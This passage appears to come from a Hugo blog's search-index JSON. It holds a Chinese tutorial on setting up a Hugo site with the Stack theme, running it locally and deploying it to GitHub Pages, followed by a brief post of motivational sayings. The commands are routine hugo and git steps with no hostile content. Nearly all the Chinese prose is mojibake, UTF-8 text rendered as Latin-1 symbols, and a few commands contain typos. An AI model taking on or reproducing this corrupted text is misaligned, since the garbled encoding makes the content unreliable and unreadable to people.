Site Generator v0.68.3/extended windows/amd64 BuildDate: unknown è¯´æ˜å®‰è£…æˆåŠŸ è®¾ç½®ç«™ç‚¹\nhugo new site myBlog ç”Ÿæˆmyblogæ–‡ä»¶å¤¹\nHugoä¸»é¢˜ä¸‹è½½ å®˜æ–¹ç½‘å€ï¼šhttps://www.gohugo.org/theme/\næˆ‘è¿™é‡Œä¸‹è½½çš„æ˜¯ï¼šCaiJimmy/hugo-theme-stack: Card-style Hugo theme designed for bloggers (github.com)\nå»ºè®®å®‰è£…æ–¹æ³•ï¼š\nå°†ä¸‹è½½å¥½çš„ä¸»é¢˜è§£å‹æ”¾å…¥ä¹‹å‰newå‡ºæ¥çš„æ–‡ä»¶å¤¹(æˆ‘è¿™é‡Œæ˜¯myblog)æ–‡ä»¶å¤¹ä¸‹çš„themesä¸‹\nå¹¶åœ¨myblog/config.tomlé‡ŒåŠ ä¸€è¡Œ theme=xxxxï¼ˆè§£å‹åçš„ä¸»é¢˜æ–‡ä»¶å¤¹çš„åç§°ï¼‰\næŠŠä¸»é¢˜ä¸­çš„config.yamlæˆ–tomlæ–‡ä»¶å¤åˆ¶æ”¾åˆ°myblogæ–‡ä»¶å¤¹ä¸‹\nå¯åŠ¨ç«™ç‚¹\nhugo server è¯·æ³¨æ„å€’æ•°ç¬¬äºŒè¡Œï¼ˆ Web Server is available at //localhost:1313/ (bind address 127.0.0.1) ï¼‰è¯´æ˜å¯åŠ¨æˆåŠŸäº†\nBuilding sites â€¦ WARN 2020/04/07 17:51:51 Markup type mmark is deprecated and will be removed in a future release. See https://gohugo.io//content-management/formats/#list-of-content-formats | EN -------------------+----- Pages | 74 Paginator pages | 0 Non-page files | 21 Static files | 8 Processed images | 28 Aliases | 14 Sitemaps | 1 Cleaned | 0 Built in 1103 ms Watching for changes in F:\\blog\\myBlog\\{archetypes,content,data,layouts,static,themes} Watching for config changes in F:\\blog\\myBlog\\config.toml, F:\\blog\\myBlog\\config\\_default Environment: \u0026#34;development\u0026#34; Serving pages from memory Running in Fast Render Mode. For full rebuilds on change: hugo server --disableFastRender Web Server is available at //localhost:1313/ (bind address 127.0.0.1) Press Ctrl+C to stop åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ localhost:1313ï¼Œå°±å¯ä»¥çœ‹åˆ°æ•ˆæœäº†\næ³¨æ„äº‹é¡¹ï¼šå¦‚æœå¯åŠ¨ç«™ç‚¹å¤±è´¥ï¼Œå¯ä»¥å…ˆå°†ä¸»é¢˜åˆ é™¤ï¼Œå†å¯åŠ¨ç«™ç‚¹ï¼Œçœ‹æ˜¯å¦æŠ¥é”™ï¼Œè‹¥æ²¡æŠ¥é”™åˆ™æ˜¯ä¸»é¢˜é…ç½®é—®é¢˜ã€‚\nåˆ›å»ºæ–‡ç«  åˆ›å»ºç¬¬ä¸€ç¯‡æ–‡ç« ï¼Œæ”¾åˆ° post ç›®å½•ï¼Œæ–¹ä¾¿ä¹‹åç”Ÿæˆèšåˆé¡µé¢ã€‚(æ³¨æ„å‘½åæ—¶ä¸å¯ä»¥ç©ºæ ¼ï¼Œå¯ä»¥ç”¨-ä»£æ›¿)\nhugo post/first.md ç„¶åå°±å¯ä»¥ä½¿ç”¨ hugo server æ¥æŸ¥çœ‹æ•ˆæœå•¦ï¼\n(æ³¨æ„ï¼šå¦‚æœæ²¡å‡ºç°æ–°æ–‡ç« ï¼Œåˆ™å¯èƒ½å¼€å¯äº†draftæ¨¡å¼ï¼Œä½¿ç”¨hogu server -D)\néƒ¨ç½²åˆ°æœåŠ¡å™¨ æˆ‘ä»¬å°†ä½¿ç”¨github.ioæ¥ä»£æ›¿æœåŠ¡å™¨ä»¥åŠåŸŸåï¼šæ¨èå‚è€ƒæ•™ç¨‹\nå‡ ä¸ªæ³¨æ„äº‹é¡¹ï¼š\nGitè¦ä¸Šä¼ æˆ–æ‰§è¡Œçš„æ–‡ä»¶å¯ä»¥åœ¨æ–‡ä»¶å¤¹ä¸­ï¼Œå³é”®ç©ºç™½åœ°åŒºç‚¹git bash hereä»è€Œå®ç°ç›®å½•å†…æ“ä½œã€‚ åœ¨linuxæ“ä½œä¸­ï¼ˆæ¯”å¦‚gitï¼‰ç²˜è´´æ“ä½œæ˜¯shift+insertæˆ–å•å‡»é¼ æ ‡çš„æ»šè½®ã€‚è€Œå¤åˆ¶åªè¦é€‰ä¸­å³å¯ã€‚ githubçš„åŸŸååœ°å€ä¸ç”¨æˆ·åå¿…é¡»ä¸€è‡´ï¼Œæ¯”å¦‚ä½ çš„githubåå­—å«sakuraï¼Œé‚£ä¹ˆåŸŸåå¿…é¡»æ˜¯sakura.github.ioã€‚ hugoå‘½ä»¤ hugo --baseURL=\u0026quot;https://ä½ çš„githubåå­—.github.io/\u0026quot;æ‰§è¡Œå®Œåï¼Œä¼šç”Ÿæˆä¸€ä¸ªpublicæ–‡ä»¶å¤¹ã€‚ ç”¨gitæ¨é€çš„æ—¶å€™ git pull --rebase origin masterè¯­å¥å¯èƒ½ä¼šå‡ºé”™æ˜¾ç¤ºæ²¡æœ‰æ–‡ä»¶ï¼Œä¸ç”¨æ‹…å¿ƒï¼Œè¿™æ˜¯å› ä¸ºæ­¤æ—¶ç›®æ ‡ä»“åº“æ˜¯ç©ºçš„ï¼Œç›´æ¥ä¸‹ä¸€æ­¥æœ€åï¼Œä½ åªéœ€è¦è¾“å…¥å¯¹åº”ç½‘å€ï¼Œå³å¯çœ‹åˆ°åšå®¢äº†ï¼ å¦‚æœæƒ³å°†é»˜è®¤è¯­è¨€è®¾ç½®ä¸ºä¸­æ–‡ï¼Œåªè¦åœ¨configä¸­è®¾ç½®ä¸€ä¸‹defaultContentLanguage=\u0026ldquo;zh-cn\u0026quot;å°±è¡Œäº†ï¼Œä½†å¯èƒ½ä¼šä¸ç”Ÿæ•ˆï¼Œæœ€å¥½å°†å…¶æ”¾åœ¨config.tomlçš„ç¬¬ä¸€è¡Œ æ›´æ–°åšå®¢ åœ¨åšå®¢ç›®å½•ä¸‹ä½¿ç”¨ hugo \u0026ndash;BaseURL=\u0026ldquo;https://ä½ çš„githubåå­—.github.io/\u0026ldquo;è¦†ç›–åŸæ¥çš„publicæ–‡ä»¶å¤¹\nhugo --BaseURL=\u0026#34;https://chenyuan1125.github.io\u0026#34; è¿›å…¥publicæ–‡ä»¶å¤¹å³é”®git bash åˆ†åˆ«æ‰§è¡Œ\ngit add . git commit -m â€˜first commitâ€™ git push origin master å¯èƒ½å­˜åœ¨çš„é—®é¢˜ï¼š\ngithubä¸Šå­˜æ”¾æ–‡ä»¶çš„ä»“åº“æ˜¯å¦åªæœ‰ä¸€ä¸ªåˆ†æ”¯ï¼ˆåˆ›å»ºæ—¶ä¸è¦å‹¾é€‰ç”ŸæˆREADME.md) æ­£å¸¸publicä¸Šä¼ githubä»“åº“åä¼šåªæœ‰ä¸€ä¸ªåˆ†æ”¯ï¼Œä¸”åŒ…å«äº†publicå†…çš„æ‰€æœ‰æ–‡ä»¶ æ–‡ç« çœ‹ä¸åˆ°,æ£€æŸ¥æ˜¯å¦æ ¼å¼æ­£ç¡®ï¼Œä½¿ç”¨äº†hugo new xxxx.md,æ£€æŸ¥æ˜¯å¦åŒ…å«äº† draft: trueï¼Œè‹¥æœ‰åˆ™åˆ é™¤æˆ–ä½¿ç”¨ hugo server -Dï¼Œè‹¥è‰ç¨¿æ¨¡å¼å¼€å¯æ˜¯çœ‹ä¸åˆ°æ–‡ç« çš„ git pushä¸æˆåŠŸ,æ­¤æ—¶å¤§æ¦‚ç‡æ˜¯ç½‘ç»œé€šä¿¡æœ‰é—®é¢˜ï¼Œå¯ä»¥å…³æ‰gitç»ˆç«¯åç§‘å­¦ä¸Šç½‘ï¼›é‡å¯git ç»ˆç«¯åï¼ˆwindowséœ€è¦ï¼Œlinuxç³»ç»Ÿä¸éœ€è¦ï¼‰å†è¿›è¡Œpushå¤§æ¦‚ç‡å°±å¯ä»¥è§£å†³é—®é¢˜äº†ï¼›æ­¤æ—¶æ— éœ€å†è¿›è¡Œgit init ç­‰åˆå§‹åŒ–æ“ä½œå› ä¸ºä¹‹å‰å·²ç»åšå®Œã€‚ æ·»åŠ è¯„è®ºåŠŸèƒ½ å¯å‚è€ƒè¿™ç¯‡åšå®¢ï¼šä½¿ç”¨vercelæ­å»ºå±äºè‡ªå·±çš„walineè¯„è®ºç³»ç»Ÿ | å‰ä¸ƒçš„å¨å¨å“” (xseven.top)\nå¦‚æœè¯„è®ºæ— æ³•æ­£å¸¸æ˜¾ç¤ºï¼Œåˆ™å¯èƒ½æ˜¯å¼•æ–‡vercel.appè¢«DNSæ±¡æŸ“å¯¼è‡´æ— æ³•ä½¿ç”¨ï¼Œéœ€è¦è‡ªè¡Œé…ç½®åŸŸåï¼Œå…·ä½“è§£å†³æ–¹æ¡ˆå¯æŸ¥çœ‹è¿™ç¯‡åšå®¢ã€‚\nWalineå›½å†…IPæ— æ³•è¯„è®ºçš„è§£å†³æ–¹æ¡ˆ(LeanCloudå›½é™…ç‰ˆ/Vercel) | æ³‰å­çš„ç†æƒ³ä¹¡ (izumi.vip)\nå‚è€ƒèµ„æ–™ ä»é›¶åˆ°ä¸€ï¼Œç”¨ Hugo æ‰“é€ ä½ çš„ä¸ªäººç½‘ç«™ (brume.top)\nå¦‚ä½•ç”¨ GitHub Pages + Hugo æ­å»ºä¸ªäººåšå®¢ Â· KrislinBlog (krislinzhao.github.io)\n","date":"2023-03-09T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1_hu13415945946882854451.jpg","permalink":"https://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","title":"ä¸ªäººåšå®¢æ­å»º"},{"content":"éšæƒ³å½• ä¸€äº›å¾ˆå¥½çš„è¯ ä¸–ç•Œä¸Šæ²¡æœ‰ç›´è·¯ï¼Œè¦å‡†å¤‡èµ°æ›²æŠ˜çš„è·¯ã€‚ åªè¦æˆ‘ä¸æ”¾å¼ƒçš„è¯ç¼˜åˆ†å°±ä¼šä¸€ç›´ä¸‹å»ã€‚ èººå¹³æœ‰æ—¶ï¼Œå¥‹æ–—åˆæ˜¯ï¼Œå‘ç–¯æœ‰æ—¶ï¼Œç†æ€§æœ‰æ—¶ï¼Œä½†æœ€ç»ˆæˆ‘ä»¬ä¾ç„¶å‘å¾€çš„æ˜¯ä¸€ç§æ­£å‘çš„ä¸œè¥¿ï¼Œè€Œä¸æ˜¯ä¸€ç§è™šä¼ªçš„ä¸œè¥¿ã€‚ ","date":"2023-03-09T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E9%9A%8F%E6%83%B3%E5%BD%95/1_hu17545487328256898304.jpg","permalink":"https://chenyuan1125.github.io/p/%E9%9A%8F%E6%83%B3%E5%BD%95/","title":"éšæƒ³å½•"}]